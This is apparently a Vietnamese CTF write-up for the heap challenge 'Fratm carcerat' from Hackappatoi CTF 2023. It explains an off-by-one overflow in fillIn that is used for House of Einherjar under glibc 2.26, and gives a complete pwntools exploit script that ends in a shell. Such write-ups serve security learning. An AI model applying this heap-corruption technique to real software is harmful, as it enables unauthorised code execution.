# Fratm carcerat

- 1 chall khá hay mình tìm được ở giải Hackappatoi CTF 2023 về kĩ thuật House of Enherjar 
- nói tóm gọn qua thì chall có 1 bug ở hàm fillIn khi cho phép nhập lố 1 byte cuối => thay đổi size của chunk kế tiếp 

![image](https://github.com/gookoosss/CTF/assets/128712571/97f3c22b-aef1-4267-8161-a1d006d7b4a1)


- lợi dụng điều này ta có thể khai thác House of Enherjar để lấy shell
- trong quá trình làm chall có rất nhiều security check liên quan đến heap ở libc2.26, nên cần phải rất cẩn thận khi debug nha(đặt biệt là để ý fd và bk khi consolidate ubins)

## script  

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./fratm_patched")
libc = ELF("./libc-2.26.so")
ld = ELF("./ld-2.26.so")

context.binary = exe


p = process([exe.path])

gdb.attach(p, gdbscript = '''

c
''')

input()

def add(idx, data1, data2, data3):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'>> ', str(idx))
    p.sendlineafter(b'NAME> ', data1)
    p.sendlineafter(b'SURNAME> ', data2)
    p.sendlineafter(b'SERIAL> ', str(data3)) 


def delete(idx):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'>> ', str(idx))

def create(idx, data1, data2):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'>> ', str(idx))
    p.sendlineafter(b'TITLE> ', data1)
    p.sendlineafter(b'CONTENT> ', data2)

def show(idx):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'>> ', str(idx))

p.sendlineafter(b'>> ', b'5')
p.recvuntil(b'Id: ')
op = int(p.recvline()[:-1], 10)
print(hex(op))

add(0, p64(0x51) + p64(op + 0x30), p64(op + 0x30), 10)
add(1, b'a', b'a', 10)
add(2, b'a', b'a', 10)
add(3, b'a', b'a', 10)
add(4, b'a', b'a', 10)
add(5, b'a', b'a', 10)
add(6, b'a', b'a', 10)
delete(1)
add(1, b'\0' , b'a'*8 + p64(0x50) + b'\xc0', 10)
delete(2)
delete(1)
create(0, b'a'*16, p64(0) + p64(0x31) + p64(op))
add(7, b'a', b'admin', 1)
add(8, b'a', b'admin', 1)
p.sendlineafter(b'>> ', b'5')
p.sendlineafter(b'>>', b'fratm')

p.interactive()
```
